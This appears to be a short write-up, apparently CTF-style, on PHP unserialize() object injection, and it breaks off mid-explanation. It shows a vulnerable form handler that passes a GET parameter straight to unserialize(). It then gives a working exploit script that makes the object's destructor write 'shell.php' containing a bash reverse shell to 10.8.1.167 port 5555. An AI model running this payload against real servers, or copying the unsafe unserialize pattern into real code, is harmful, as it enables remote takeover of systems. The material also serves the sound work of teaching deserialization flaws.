check https://notsosecure.com/remote-code-execution-php-unserialize

Example:
```
<?php                                                                                                                                                                                                                            

class FormSubmit {                                                                                                                                                                                                               

public $form_file = 'message.txt';                                                                                                                                                                                               
public $message = '';                                                                                                                                                                                                            

public function SaveMessage() {                                                                                                                                                                                                  

$NameArea = $_GET['name'];                                                                                                                                                                                                       
$EmailArea = $_GET['email'];                                                        
$TextArea = $_GET['comments'];

        $this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";                                                                                                
}                                                                                   
public function __destruct() {            

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);                                 
echo 'Your submission has been successfully saved!';                                            
}                                               
}                                         
// Leaving this for now... only for debug purposes... do not touch!                                             
$debug = $_GET['debug'] ?? '';                                                                                                                                           
$messageDebug = unserialize($debug);      

$application = new FormSubmit;
$application -> SaveMessage();                                                                  
?>     
```

Leads to 
```
<?php
class FormSubmit
{
   public $form_file = 'shell.php';
   public $message = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.8.1.167/5555 0>&1\'");';
}
print urlencode(serialize(new FormSubmit));
?>
```

This works because the `form_file` specifies the entire file name, and the `message` 